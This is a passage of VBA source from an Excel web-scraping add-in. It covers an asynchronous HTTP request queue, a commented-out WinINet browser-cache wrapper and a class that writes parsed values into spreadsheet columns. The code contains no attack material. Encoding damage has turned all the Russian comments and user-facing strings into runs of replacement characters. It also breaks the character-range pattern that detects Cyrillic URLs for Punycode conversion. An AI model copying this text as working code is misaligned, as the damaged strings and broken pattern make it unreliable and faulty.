    pi.ExtraBar_SetLineText 3, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|): " & Me.RequestFinished & " / " & SourceURLsAmount & "  (" & Finished_Percent& & "%)"
    pi.ExtraBar_SetLineText 4, line2$

    LastPercent& = Finished_Percent&

    Dim v1&, v2&, v3&, ProgressLineText$
    v1 = Finished_Percent&
    v2 = Answered_Percent& - Finished_Percent&: If v2 < 0 Then v2 = 0
    v3 = Started_Percent& - Answered_Percent&
    ProgressLineText$ = String(v1&, ChrW(9646)) & String(v2&, ChrW(9705)) & String(v3&, ChrW(9647))
    pi.FP.ExtraBar = " " & ProgressLineText$
    'pi.FP.ExtraBar = " " & v1& & ", " & v2& & ", " & v3& & ": " & ProgressLineText$

    'pi.Repaint
    LastUpdateTime = Now
    DoEvents
End Sub

Sub ExecuteNext()
    If StopMacro Then Exit Sub
    If SourceURLs.Count = 0 Then Exit Sub
    On Error Resume Next

    Dim H As New HTTP_Request, ind&
    ind& = SourceURLsAmount - SourceURLs.Count + 1
    With H
        Set .Parent = Me
        H.ThreadID = CStr(ind&)
        H.Encoding = Me.Encoding
        H.URL = SourceURLs(1&)
        If H.URL Like "*[|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then H.URL = ConvertURLtoPunycode(H.URL)
        
        H.StartTime = Now
    End With
    SourceURLs.Remove 1&
    Requests.Add H.ThreadID, H

    With H.http
        .SetTimeouts Me.Timeout * 1000, Me.Timeout * 1000, Me.Timeout * 1000, Me.Timeout * 1000
        .Open "GET", H.URL, True
        If RunningParser.Options.UseClientCertificate Then .SetClientCertificate RunningParser.Options.ClientCertificateName
        PageLoadRequested H.URL
        AddRequestHeadersFromStore H.http
        If Not CookiesStore Is Nothing Then .SetRequestHeader "Cookie", GetCookiesFromStore
        .Send
    End With
End Sub

Sub Finished(ByRef H As HTTP_Request)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim ThreadID$, InfoTag$
    ThreadID$ = H.ThreadID

    With H
        If .Encoding = "utf-8" Then .Response = DecodeUTF8(.Response)
        InfoTag$ = "<info id='parser multithreading' status='" & .Status & "' encoding='" & .Encoding & "' href='" & .URL & "'></info>"

        If Len(Me.HTML_Filters) Then
            .Response = InfoTag$ & vbNewLine & ApplyHTMLFilters(.Response, Me.HTML_Filters)
        Else
            .Response = Replace(.Response, "</head>", vbNewLine & InfoTag$ & vbNewLine & "</head>", , 1)
        End If
        
        ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If InStr(1, .Response, InfoTag$, vbTextCompare) = 0 Then .Response = InfoTag$ & vbNewLine & .Response

        result.Add ThreadID$, .Response
    End With

    Set H = Nothing
    Me.RequestFinished = Me.RequestFinished + 1
    Requests.Remove ThreadID$
    'Debug.Print "ThreadID " & ThreadID$ & " destroyed"
    ExecuteNext
End Sub

Attribute VB_Name = "InternetCache"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'' http://www.cyberforum.ru/visual-basic/thread903024.html
'
'Option Explicit
'
'Private Const LMEM_FIXED As Long = &H0
'Private Const LMEM_ZEROINIT As Long = &H40
'
'Private Type FILETIME
'    lLowDateTime As Long
'    lHighDateTime As Long
'End Type
'
'Private Type SYSTEMTIME
'        wYear As Integer
'        wMonth As Integer
'        wDayOfWeek As Integer
'        wDay As Integer
'        wHour As Integer
'        wMinute As Integer
'        wSecond As Integer
'        wMilliseconds As Integer
'End Type
'
'Private Type INTERNET_CACHE_ENTRY_INFO
'   dwStructSize As Long
'   lpszSourceUrlName As Long
'   lpszLocalFileName As Long
'   CacheEntryType As Long
'   dwUseCount As Long
'   dwHitRate As Long
'   dwSizeLow As Long
'   dwSizeHigh As Long
'   LastModifiedTime As FILETIME
'   ExpireTime As FILETIME
'   LastAccessTime As FILETIME
'   LastSyncTime As FILETIME
'   lpHeaderInfo As Long
'   dwHeaderInfoSize As Long
'   lpszFileExtension As Long
'   dwExemptDelta As Long
'End Type
'
'Private Declare Function FindFirstUrlCacheEntry Lib "wininet.dll" Alias "FindFirstUrlCacheEntryA" ( _
'        ByVal lpszSearchPattern As String, _
'        ByVal lpCacheInfo As Long, _
'        lpdwFirstCacheEntryInfoBufferSize As Long) As Long
'
'Private Declare Function FindNextUrlCacheEntry Lib "wininet.dll" Alias "FindNextUrlCacheEntryA" ( _
'        ByVal hEnumHandle As Long, _
'        ByVal lpCacheInfo As Long, _
'        lpdwNextCacheEntryInfoBufferSize As Long) As Long
'
'Private Declare Function FindCloseUrlCache Lib "wininet.dll" ( _
'        ByVal hEnumHandle As Long) As Long
'
'Private Declare Function GetUrlCacheEntryInfo Lib "wininet.dll" Alias "GetUrlCacheEntryInfoA" ( _
'        ByVal lpszUrlName As String, _
'        ByVal lpCacheInfo As Long, _
'        lpdwCacheEntryInfoBufferSize As Long) As Long
'
'Private Declare Function DeleteUrlCacheEntry Lib "wininet.dll" Alias "DeleteUrlCacheEntryA" ( _
'        ByVal lpszUrlName As String) As Long
'
'Private Declare Function PtrToStr Lib "kernel32" Alias "lstrcpyA" (ByVal RetVal As String, ByVal Ptr As Long) As Long
'Private Declare Function FileTimeToSystemTime Lib "kernel32" (lpFileTime As FILETIME, lpSystemTime As SYSTEMTIME) As Long
'Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDest As Any, pSource As Any, ByVal dwLength As Long)
'Private Declare Function LocalAlloc Lib "kernel32" (ByVal uFlags As Long, ByVal uBytes As Long) As Long
'Private Declare Function LocalFree Lib "kernel32" (ByVal hMem As Long) As Long
'Private Declare Function lstrcpyA Lib "kernel32" (ByVal RetVal As String, ByVal Ptr As Long) As Long
'Private Declare Function lstrlenA Lib "kernel32" (ByVal Ptr As Any) As Long
'
'Private hEnumHandle As Long
'Private ci As INTERNET_CACHE_ENTRY_INFO
'Private lPtrCI As Long
'
'Public Property Get CachedEntryCacheType() As Long
'    CachedEntryCacheType = ci.CacheEntryType
'End Property
'
'Public Property Get CachedEntryExpireTime() As Date
'On Local Error Resume Next
'Dim dExpire As Date
'Dim stSystemTime As SYSTEMTIME
'Dim lReturnValue As Long
'    lReturnValue = FileTimeToSystemTime(ci.ExpireTime, stSystemTime)
'    With stSystemTime
'        dExpire = CDate(.wMonth & "/" & .wDay & "/" & .wYear & " " & .wHour & ":" & .wMinute & ":" & .wSecond)
'    End With
'    CachedEntryExpireTime = dExpire
'End Property
'
'Public Property Get CachedEntryFileExtension() As String
'Dim strData As String
'Dim lReturnValue As Long
'Dim iPosition As Long
'    strData = Space(250)
'    lReturnValue = PtrToStr(strData, ci.lpszFileExtension)
'    If lReturnValue Then
'        iPosition = InStr(strData, Chr(0))
'        CachedEntryFileExtension = Left$(strData, iPosition - 1)
'    End If
'End Property
'
'Public Property Get CachedEntryLastAccessTime() As Date
'Dim dExpire As Date
'Dim stSystemTime As SYSTEMTIME
'Dim lReturnValue As Long
'    lReturnValue = FileTimeToSystemTime(ci.LastAccessTime, stSystemTime)
'    With stSystemTime
'        dExpire = CDate(.wMonth & "/" & .wDay & "/" & .wYear & " " & .wHour & ":" & .wMinute & ":" & .wSecond)
'    End With
'    CachedEntryLastAccessTime = dExpire
'End Property
'
'Public Property Get CachedEntryLastModifiedTime() As Date
'Dim dExpire As Date
'Dim stSystemTime As SYSTEMTIME
'Dim lReturnValue As Long
'    lReturnValue = FileTimeToSystemTime(ci.LastModifiedTime, stSystemTime)
'    With stSystemTime
'        dExpire = CDate(.wMonth & "/" & .wDay & "/" & .wYear & " " & .wHour & ":" & .wMinute & ":" & .wSecond)
'    End With
'    CachedEntryLastModifiedTime = dExpire
'End Property
'
'Public Property Get CachedEntryLastSyncTime() As Date
'Dim dExpire As Date
'Dim stSystemTime As SYSTEMTIME
'Dim lReturnValue As Long
'    lReturnValue = FileTimeToSystemTime(ci.LastSyncTime, stSystemTime)
'    With stSystemTime
'        dExpire = CDate(.wMonth & "/" & .wDay & "/" & .wYear & " " & .wHour & ":" & .wMinute & ":" & .wSecond)
'    End With
'    CachedEntryLastSyncTime = dExpire
'End Property
'
'Public Property Get CachedEntryFileName() As String
'Dim strData As String
'Dim lReturnValue As Long
'Dim iPosition As Long
'    strData = String$(lstrlenA(ByVal ci.lpszLocalFileName), 0)
'    lReturnValue = lstrcpyA(strData, ci.lpszLocalFileName)
'    If lReturnValue Then CachedEntryFileName = strData
'End Property
'
'Public Property Get CachedEntrySourceURL() As String
'Dim strData As String
'Dim lReturnValue As Long
'Dim iPosition As Long
'    strData = String$(lstrlenA(ci.lpszSourceUrlName), 0)
'    lReturnValue = lstrcpyA(strData, ci.lpszSourceUrlName)
'    If lReturnValue Then CachedEntrySourceURL = strData
'End Property
'
'Public Function DeleteCacheEntry(SourceUrl As String) As Boolean
'Dim lReturnValue As Long
'    lReturnValue = DeleteUrlCacheEntry(SourceUrl)
'    DeleteCacheEntry = CBool(lReturnValue)
'End Function
'
'Public Function FindEntryInCache(URL As String) As Boolean
'Dim lReturnValue As Long, lSizeOfStruct As Long
'    lReturnValue = GetUrlCacheEntryInfo(URL, 0&, lSizeOfStruct)
'    If lPtrCI Then LocalFree lPtrCI
'    lPtrCI = LocalAlloc(LMEM_FIXED, lSizeOfStruct)
'    If lPtrCI Then
'        CopyMemory ByVal lPtrCI, lSizeOfStruct, 4
'        lReturnValue = GetUrlCacheEntryInfo(URL, lPtrCI, lSizeOfStruct)
'        CopyMemory ci, ByVal lPtrCI, Len(ci)
'        LocalFree lPtrCI
'    End If
'    FindEntryInCache = CBool(lReturnValue)
'End Function
'
'Public Function FindFirstCacheEntry() As Boolean
'Dim lSizeOfStruct As Long
'    If hEnumHandle <> 0 Then FindCloseUrlCache hEnumHandle
'    hEnumHandle = FindFirstUrlCacheEntry(vbNullString, 0&, lSizeOfStruct)
'    If lPtrCI Then LocalFree lPtrCI
'    lPtrCI = LocalAlloc(LMEM_FIXED, lSizeOfStruct)
'    If lPtrCI Then
'        CopyMemory ByVal lPtrCI, lSizeOfStruct, 4
'        hEnumHandle = FindFirstUrlCacheEntry(ByVal vbNullString, lPtrCI, lSizeOfStruct)
'        CopyMemory ci, ByVal lPtrCI, Len(ci)
'    End If
'    FindFirstCacheEntry = CBool(hEnumHandle)
'End Function
'
'Public Function FindNextCacheEntry() As Boolean
'Dim lReturnValue As Long, lSizeOfStruct As Long
'    If hEnumHandle <> 0 Then
'        lReturnValue = FindNextUrlCacheEntry(hEnumHandle, 0&, lSizeOfStruct)
'        If lPtrCI Then LocalFree lPtrCI
'        lPtrCI = LocalAlloc(LMEM_FIXED, lSizeOfStruct)
'        If lPtrCI Then
'            CopyMemory ByVal lPtrCI, lSizeOfStruct, 4
'            lReturnValue = FindNextUrlCacheEntry(hEnumHandle, lPtrCI, lSizeOfStruct)
'            CopyMemory ci, ByVal lPtrCI, Len(ci)
'        End If
'        If lReturnValue <> 0 Then FindNextCacheEntry = CBool(lReturnValue)
'    End If
'End Function
'
'Private Sub Class_Terminate()
'    If hEnumHandle Then Call FindCloseUrlCache(hEnumHandle)
'End Sub
'
Attribute VB_Name = "OutputColumn"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : OutputColumn                    Version:
' Author        : Igor Vakhnenko                   Date: 24.09.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Option Explicit

Const XML_NODE_NAME$ = "Column"
Public Parent As OutputColumns
Public Enabled As Boolean        ' |fffd||fffd||fffd||fffd| FALSE - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
Public OutputEnabled As Boolean        ' |fffd||fffd||fffd||fffd| FALSE - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|

Public Actions As New ArrayActions
Public Index As Long

Public Column As Long
Public Name As String

Public MulticolumnEnabled As Boolean
Public MulticolumnStep As Long
'Public MulticolumnHeadersEnabled As Boolean        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public MulticolumnHeadersCount As Long        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| 2 |fffd| |fffd||fffd||fffd||fffd|)
Public MulticolumnHeadersSuffixEnabled As Boolean        ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public MulticolumnHeadersSuffixValue As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (0 |fffd||fffd||fffd| 1)

Public DynamicColumns As Boolean        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

Public Format As New OutputColumnFormat

Private Sub Class_Initialize()
    Me.Enabled = True
    Me.OutputEnabled = True
    Set Me.Format.Parent = Me
    Me.MulticolumnStep = 1
    Me.MulticolumnHeadersCount = 2
    Me.MulticolumnHeadersSuffixValue = "1"
End Sub

Private Sub Class_Terminate()
    Set Actions = Nothing
    Set Format = Nothing
    Set Parent = Nothing
End Sub

Sub Execute(ByVal txt$, ByRef destCell As Range)
    On Error Resume Next
    If Not Me.Enabled Then Exit Sub
    
    Dim FO As Boolean
    FO = destCell Is Nothing
    
    RowVariables.item("{column}") = RowVariables.item("{" & Me.Column & "}")
    RowVariables.item("{column@}") = RowVariables.item("{" & Me.Column & "@}")
    
    Dim ColumnOffset&
    ColumnOffset& = RunningParser.SourceData.GetColumnOffset
    
    If DESCRIPTION_MODE_FOR_ITEM Then PublishHTML_StartNewTable _
        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColumnNameByColumnNumber(Me.Column) & _
        "  (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd|)", "table-output-column"
    
    Set MacroDestinationRange = destCell
    If Not FO Then If Me.Column > 0 And Me.OutputEnabled Then Set MacroDestinationRange = destCell.EntireRow.Cells(Me.Column + ColumnOffset&)
    
    RowVariables.item("{ColumnName}") = Me.Name
    RowVariables.item("{ColumnLetter}") = Split(Application.ConvertFormula("=r1c" & Me.Column + ColumnOffset&, xlR1C1, xlA1), "$")(1)
    
    DEBUG_LevelInfo$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Me.Column & " |fffd|" & Me.Name & "|fffd|"
    
    Me.Actions.ApplyTo txt$
    If StopMacro Then Exit Sub
    RowVariables.item("{" & Me.Column & "}") = txt$
    RowVariables.item("{column}") = txt$
    
    Dim cell As Range, arr, i&, CellColumn&
    
    If Me.Column > 0 And Me.OutputEnabled Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ro
        
        If Me.MulticolumnEnabled And Not Me.DynamicColumns Then
            ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If InStr(1, txt, ARSEP) > 0 Then arr = Split(txt$, ARSEP) Else arr = Array(txt$)
            If Me.MulticolumnStep <= 0 Then Me.MulticolumnStep = 1
            
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            For i = LBound(arr) To Application.min(UBound(arr), Me.MulticolumnHeadersCount - 1)
                CellColumn& = Me.Column + ColumnOffset& + i * Me.MulticolumnStep
                If FO Then
                    OutputToCell_FO arr(i), CellColumn&
                Else
                    Set cell = Nothing: Set cell = destCell.EntireRow.Cells(CellColumn&)
                    If Not cell Is Nothing Then OutputToCell arr(i), cell, Me.Format
                End If
            Next i
            
        Else
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            CellColumn& = Me.Column + ColumnOffset&
            Set cell = Nothing
            
            If FO Then
                If Me.DynamicColumns Then
                    OutputToDynamicColumns txt$, cell, CellColumn&
                Else
                    OutputToCell_FO txt, CellColumn&
                End If
            Else
                Set cell = destCell.EntireRow.Cells(CellColumn&)
                If Me.DynamicColumns Then
                    OutputToDynamicColumns txt$, cell
                Else
                    OutputToCell txt, cell, Me.Format
                End If
            End If
            
        End If
    End If
    
    If DESCRIPTION_MODE_FOR_ITEM Then PublishHTML_CloseTable
    Set cell = Nothing: Erase arr
End Sub

Private Sub OutputToDynamicColumns(ByVal txt$, ByRef cell As Range, Optional ByVal CellColumn& = 0)
    ' CellColumn& |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| FAST OUTPUT, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| cell = nothing
    
    On Error Resume Next: Static NoMoreColumns As Boolean
    If txt = "" Then Exit Sub
    Dim HeaderRow As Range, hRowNumber&, txtH$, txtV$, arr, i&, col As Range, LastCell As Range, DColumnNumber&, FO As Boolean
    Dim sh As Worksheet
    hRowNumber& = Me.Parent.SheetOptions.HeaderRowNumber
    
    FO = cell Is Nothing
    
    If FO Then    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| FAST OUTPUT
        If CellColumn& = 0 Then MsgBox "CellColumn& = 0", vbCritical, "Sub OutputToDynamicColumns"
        Set sh = Me.Parent.Parent.Sheet
    Else
        CellColumn& = cell.Column
        Set sh = cell.Worksheet
    End If
    Set HeaderRow = sh.Cells(hRowNumber&, CellColumn&).Resize(, sh.Columns.Count - CellColumn& + 1)
    
    arr = Split(txt, ARSEP)
    For i = LBound(arr) To UBound(arr)
        txtH$ = "": txtH$ = Trim(Split(arr(i), "|")(0))
        txtV$ = "": txtV$ = Trim(Split(arr(i), "|", 2)(1))
        'Debug.Print txtH$, txtV$
        If Len(txtH$) Then
            DColumnNumber& = 0    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            
            If FO Then    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| FAST OUTPUT
                Set col = Nothing: Set col = HeaderRow.Find(txtH$, , xlValues, xlWhole, , , False).EntireColumn
                If (col Is Nothing) And IsDate(txtH$) Then Set col = HeaderRow.Find(DateValue(txtH$), , xlFormulas, xlWhole, , , False).EntireColumn
                HeaderRow.Find "*", , , xlPart    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                DColumnNumber& = col.Column
            Else
                Set col = Nothing: Set col = HeaderRow.Find(txtH$, , xlValues, xlWhole, , , False).EntireColumn
                If (col Is Nothing) And IsDate(txtH$) Then Set col = HeaderRow.Find(DateValue(txtH$), , xlFormulas, xlWhole, , , False).EntireColumn
                HeaderRow.Find "*", , , xlPart    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                DColumnNumber& = col.Column
            End If
            
            
            If DColumnNumber& = 0 Then      ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If NoMoreColumns Then Exit For
                Set LastCell = sh.Cells(hRowNumber&, sh.Columns.Count)
                If LastCell.value <> "" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    NoMoreColumns = True
                    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & sh.Columns.Count & ") |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
                    Exit For
                End If
                Set col = LastCell.End(xlToLeft).Next.EntireColumn
                If col.Column < CellColumn& Then Set col = sh.Columns(CellColumn&)
                DColumnNumber& = col.Column
                
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                With col.EntireColumn
                    DoEvents: Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & col.Column & "  - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    .Hidden = Me.Format.ColumnWidth = 0
                    If Me.Format.ColumnWidth <> DEFAULT_COLUMN_WIDTH And .ColumnWidth = .Parent.StandardWidth Then
                        If Me.Format.ColumnWidth > 0 Then .ColumnWidth = Me.Format.ColumnWidth
                    End If
                    
                    If Me.Parent.SheetOptions.FormatColumns Then
                        .Resize(.Worksheet.Rows.Count - hRowNumber&).Offset(hRowNumber&).WrapText = Me.Format.WrapText
                        .VerticalAlignment = xlVAlignCenter
                        If Me.Format.HorizontalAlignment > 0 Then
                            .HorizontalAlignment = CHOOSE(Me.Format.HorizontalAlignment, xlHAlignLeft, xlHAlignCenter, xlHAlignRight)
                        End If
                    End If
                End With
                Me.Parent.Parent.PrInd1.ShowMessage ""
                
                With col.Cells(hRowNumber&)
                    DoEvents: Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & col.Column & "  - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    .value = txtH$
                    .HorizontalAlignment = xlHAlignCenter: .VerticalAlignment = xlVAlignCenter
                    .WrapText = True: .Interior.Color = Me.Format.HeaderColor: .Font.Bold = True: .Font.Size = .Font.Size - 1
                    .Borders.LineStyle = xlContinuous
                End With
                Me.Parent.Parent.PrInd1.ShowMessage tt("PI_ShowMessage_NewColumnsAdded", col.Column - CellColumn& + 1)
            End If
            
            If FO Then
                OutputToCell_FO txtV$, DColumnNumber&
                'Debug.Print "col=" & DColumnNumber&, "v=" & txtV$
            Else
                OutputToCell txtV$, Intersect(cell.EntireRow, col)
            End If
            
        End If
    Next i
    Set HeaderRow = Nothing: Set col = Nothing: Set LastCell = Nothing: Erase arr
End Sub

Private Sub OutputToCell_FO(ByVal txt$, ByVal CellColumn&)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt$ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| cell
    On Error Resume Next
    Dim CommentText$, HL_new$, comm$, cuttext$, HyperlinkChanged As Boolean, v As Variant
    orc& = orc& + 1: If toi& > 0 Then If (orc& Mod toi&) = 0 Then txt$ = to_RW
    
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd|
    Dim URL$, CellText$, OutputAsHyperlink As Boolean
    If Me.Format.HyperlinkEnable Then
        OutputAsHyperlink = True
        If Len(Trim(Me.Format.HyperlinkURL)) Then
            ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HyperlinkURL
            URL$ = Render(Trim(Me.Format.HyperlinkURL))
            
            ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| HyperlinkTextToDisplay, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            If Len(Trim(Me.Format.HyperlinkTextToDisplay)) Then
                CellText$ = Render(Me.Format.HyperlinkTextToDisplay)
            Else
                CellText$ = txt
            End If
        Else
